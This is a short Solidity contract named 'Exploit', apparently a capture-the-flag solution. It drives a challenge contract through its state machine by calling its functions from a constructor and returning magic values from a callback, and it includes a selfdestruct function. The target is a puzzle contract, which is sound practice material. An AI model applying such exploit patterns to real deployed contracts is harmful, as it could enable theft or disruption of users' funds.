pragma solidity 0.8.4;

enum State { THREE, TWO, ONE, ZERO }

interface IChallenge2 {
    function first() external;
    function second() external;
    function third() external;
    function fourth() external;
    function state() external returns (State);
}

interface ICalled {
    function sup() external returns (uint256);
}


contract Exploit is ICalled {
    IChallenge2 challenge;

    constructor(IChallenge2 _challenge) {
        challenge = _challenge;

        if (challenge.state() == State.THREE) {
            challenge.third();
        }
        else if (challenge.state() == State.ONE) {
            challenge.first();
        }
        else {
            revert("wrong contract state");
        }
    }

    function second() public payable {
        challenge.second();
    }

    function fourth() public payable {
        challenge.fourth();
    }

    function kill() public payable {
        selfdestruct(payable(address(0)));
    }

    function sup() public override returns (uint256){
        if (challenge.state() == State.TWO) {
            return 1337;
        } else if (challenge.state() == State.ZERO) {
            return 80085;
        } else {
            revert("wrong contract state 2");
        }
    }

    receive() external payable {}

    fallback() external payable {}
}
